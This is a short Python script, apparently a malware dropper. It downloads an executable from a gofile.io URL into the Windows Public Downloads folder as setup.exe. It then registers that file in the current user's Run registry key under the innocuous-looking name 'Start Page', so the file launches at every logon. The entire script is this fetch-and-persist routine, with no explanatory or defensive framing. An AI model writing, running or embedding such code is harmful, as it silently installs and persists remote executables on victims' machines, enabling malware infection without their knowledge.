import wget
import winreg


url = "https://srv-file21.gofile.io/downloadStore/srv-store4/maAhtT/main.exe"
wget.download(url, r'C:\users\Public\Downloads\setup.exe')


keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
except:
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
winreg.SetValueEx(key, "Start Page", 0, winreg.REG_SZ, r'C:\Users\Public\Downloads\setup.exe')
winreg.CloseKey(key)

